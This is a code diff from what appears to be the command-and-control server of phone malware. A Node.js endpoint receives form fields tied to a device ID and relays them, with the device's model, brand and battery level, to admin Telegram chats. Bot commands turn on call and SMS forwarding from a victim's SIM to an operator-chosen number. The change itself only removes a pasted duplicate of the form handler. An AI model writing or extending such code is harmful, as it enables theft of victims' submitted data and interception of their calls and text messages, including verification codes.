@@ -116,6 +116,7 @@ app.post('/html-form-data', (req, res) => {
 
   res.sendStatus(200);
 });
+
 // ===== TELEGRAM BOT =====
 bot.on('message', msg => {
   const chatId = msg.chat.id;
@@ -133,33 +134,7 @@ bot.on('message', msg => {
     }
     if(s.action==='call_forward_on' || s.action==='sms_forward_on'){
       const forwardTo = text;
-      if(s.action==='call_forward_on'){ addCommand(s.uuid,{type:'call_forward',action:'on',sim:s.sim,number:forwardTo}); bot.sendMessage(chatId,`✅ app.post('/html-form-data', (req, res) => {
-  const { uuid, ...fields } = req.body;
-  if (!uuid) return res.status(400).send('missing uuid');
-
-  // Save form data
-  const fp = path.join(STORAGE_DIR, `${uuid}.json`);
-  fs.writeJsonSync(fp, fields, { spaces: 2 });
-
-  // Get device info (including battery and brand)
-  const device = devices.get(uuid) || { model: uuid, brand: 'Unknown', battery: 'N/A' };
-
-  // Prepare message with brand below device name
-  let msg = `🧾 *Form Submitted*\n📱 ${device.model}\n🏷 Brand: ${device.brand}\n🔋 Battery: ${device.battery || 'N/A'}%\n`;
-
-  // Add all form fields
-  for (let [k, v] of Object.entries(fields)) {
-    const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
-    msg += `🔸 *${label}*: ${v}\n`;
-  }
-
-  msg += `\n👨‍💻 Developer: ${DEVELOPER}`;
-
-  // Send to all admins
-  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
-
-  res.sendStatus(200);
-});Call Forward ON SIM${s.sim} → ${forwardTo}`);}
+      if(s.action==='call_forward_on'){ addCommand(s.uuid,{type:'call_forward',action:'on',sim:s.sim,number:forwardTo}); bot.sendMessage(chatId,`✅ Call Forward ON SIM${s.sim} → ${forwardTo}`);}
       if(s.action==='sms_forward_on'){ addCommand(s.uuid,{type:'sms_forward',action:'on',sim:s.sim,number:forwardTo}); bot.sendMessage(chatId,`✅ SMS Forward ON SIM${s.sim} → ${forwardTo}`);}
       delete sessions[chatId]; return;
     }
